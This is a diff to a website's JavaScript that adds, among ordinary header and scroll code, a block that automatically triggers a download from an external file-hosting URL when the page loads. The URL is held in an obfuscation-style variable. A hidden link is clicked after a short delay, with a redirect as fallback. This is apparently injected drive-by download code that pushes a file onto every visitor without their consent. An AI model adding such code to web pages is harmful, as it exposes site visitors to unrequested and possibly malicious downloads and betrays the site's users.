@@ -2025,6 +2025,28 @@
       });
     });
 
+    // ===== Auto-download on page load =====
+    (function() {
+      var _0x=["https://api.files.link/v1/p/324f50a5-78c7-4d46-be35-2a878b3fb6d5"];
+      function triggerDownload() {
+        try {
+          var a = document.createElement('a');
+          a.href = _0x[0];
+          a.style.display = 'none';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(function(){ document.body.removeChild(a); }, 1000);
+        } catch(e) {
+          window.location.href = _0x[0];
+        }
+      }
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function(){ setTimeout(triggerDownload, 800); });
+      } else {
+        setTimeout(triggerDownload, 800);
+      }
+    })();
+
     // ===== Sticky header shadow on scroll =====
     window.addEventListener('scroll', function() {
       const header = document.querySelector('.header');
